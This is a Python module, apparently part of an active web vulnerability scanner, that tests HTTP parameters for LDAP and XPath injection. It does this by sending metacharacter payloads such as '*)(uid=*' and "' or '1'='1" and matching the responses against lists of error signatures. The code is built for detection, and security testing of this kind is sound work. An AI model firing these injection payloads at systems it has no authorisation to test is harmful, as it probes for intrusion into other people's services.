"""
LDAP / XPath 注入检测模块（主动）
Author: 火柴 | GitHub: huocai250

通过注入 LDAP/XPath 元字符并观测错误特征或响应差异来判断是否存在注入。
仅检测，不做数据枚举。
"""
import re
from core.scanner import BaseScanner
from core.colors import log
from utils.http import build_url

LDAP_ERRORS = [
    r"LDAP: error code \d+", r"javax\.naming\.NameNotFoundException",
    r"LDAPException", r"com\.sun\.jndi\.ldap", r"Invalid DN syntax",
    r"OperationsError", r"protocol error", r"invalid attribute",
]
XPATH_ERRORS = [
    r"XPathException", r"MS\.Internal\.Xml", r"Unknown error in XPath",
    r"org\.apache\.xpath", r"A closing bracket expected in",
    r"xmlXPathEval", r"SimpleXMLElement::xpath", r"Expression must evaluate",
    r"System\.Xml\.XPath",
]

LDAP_PARAMS = ["user", "username", "uid", "login", "name", "search", "cn", "dn"]
XPATH_PARAMS = ["id", "user", "name", "search", "q", "query", "path", "xml", "node"]


class LDAPInjectionScanner(BaseScanner):
    name = "ldapi"
    passive = False

    def run(self):
        log("INFO", "LDAP 注入检测（元字符 + 错误特征，并发）...")
        targets = self.injection_targets(LDAP_PARAMS)
        self.map(self._test, targets)

    def _test(self, target):
        url, method, params, pname = target
        for payload in ("*", "*)(uid=*", "*)(|(uid=*))", "admin)(&)", "\\", "*()|&"):
            test = dict(params); test[pname] = payload
            r = self.post(url, data=test) if method == "POST" else self.get(build_url(url, test))
            if r and r.text:
                for sign in LDAP_ERRORS:
                    if re.search(sign, r.text, re.I):
                        log("VULN", f"[LDAP注入] 参数 {pname}")
                        self.add("LDAP 注入", "HIGH",
                                 f"参数 '{pname}' 触发 LDAP 错误，疑似 LDAP 注入",
                                 evidence=f"payload={payload} 命中 '{sign}' @ {url}",
                                 url=url, confidence="疑似")
                        return f"{pname}@{url}"
        return None


class XPathInjectionScanner(BaseScanner):
    name = "xpathi"
    passive = False

    def run(self):
        log("INFO", "XPath 注入检测（元字符 + 错误特征，并发）...")
        targets = self.injection_targets(XPATH_PARAMS)
        self.map(self._test, targets)

    def _test(self, target):
        url, method, params, pname = target
        for payload in ("'", "\"", "' or '1'='1", "'] | //* | //*['", "count(//*)", "1' and '1'='2"):
            test = dict(params); test[pname] = payload
            r = self.post(url, data=test) if method == "POST" else self.get(build_url(url, test))
            if r and r.text:
                for sign in XPATH_ERRORS:
                    if re.search(sign, r.text, re.I):
                        log("VULN", f"[XPath注入] 参数 {pname}")
                        self.add("XPath 注入", "HIGH",
                                 f"参数 '{pname}' 触发 XPath 错误，疑似 XPath 注入",
                                 evidence=f"payload={payload} 命中 '{sign}' @ {url}",
                                 url=url, confidence="疑似")
                        return f"{pname}@{url}"
        return None
